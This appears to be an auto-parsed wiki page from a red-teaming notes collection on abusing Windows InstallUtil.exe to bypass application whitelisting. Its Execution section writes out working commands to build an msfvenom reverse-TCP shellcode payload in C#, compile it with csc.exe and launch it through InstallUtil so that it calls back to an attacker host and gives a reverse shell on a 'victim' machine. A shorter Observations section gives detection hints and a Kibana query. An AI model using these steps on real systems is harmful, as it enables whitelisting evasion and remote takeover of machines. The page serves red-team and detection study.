---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# InstallUtil

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1118-installutil` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1118-installutil.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

First of, let's generate a C\# payload \(with InstallUtil script\) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:

## Preserved Body

````markdown
## Execution

First of, let's generate a C\# payload \(with [InstallUtil script](https://github.com/khr0x40sh/WhiteListEvasion)\) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:
```csharp
python InstallUtil.py --cs_file temp.cs --exe_file temp.exe --payload windowsreverse_shell_tcp --lhost 10.0.0.5 --lport 443
```
Compile the .cs to an .exe:
```csharp
PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe C:\experiments\installUtil\temp.cs
```
Execute the payload:
```csharp
PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Microsoft.NET\Framework\v4.0.30319\temp.exe
Microsoft (R) .NET Framework Installation utility Version 4.0.30319.17929
Copyright (C) Microsoft Corporation.  All rights reserved.

Hello From Uninstall...I carry out the real work...
```
Enjoy the sweet reverse shell:

![](<../../_assets/installutil-shell.png>)

## Observations

Look for `InstallUtil` processes that have established connections, especially those with cmd or powershell processes running as children - you should treat them as suspicious and investigate the endpoint closer:

![](<../../_assets/installutil-procexp.png>)

A very primitive query in kibana allowing to find events where InstallUtil spawns cmd:
```text
event_data.ParentCommandLine:"*installutil.exe*" && event_data.Image:cmd.exe
```
![InstallUtil launching the malicious payload](<../../_assets/installutil-kibana.png>)

![csc.exe created a temp.exe which contains the reverse shell payload](<../../_assets/installutils-csc.png>)

What is interesting is that I could not see an established network connection logged in sysmon logs, although I could see other network connections from the victim machine being logged.
Will be coming back to this one for further inspection - possibly related to sysmon configuration.
## References
````

## Source Verification

[source record](../../sources/redteamingtactics/installutil.md)

## Evidence Excerpt

```text
_asset_filenames:
- installutil-kibana.png
- installutil-procexp.png
- installutil-shell.png
- installutils-csc.png
_body: '---
description: InstallUtil code execution - bypass application whitelisting.
---
```
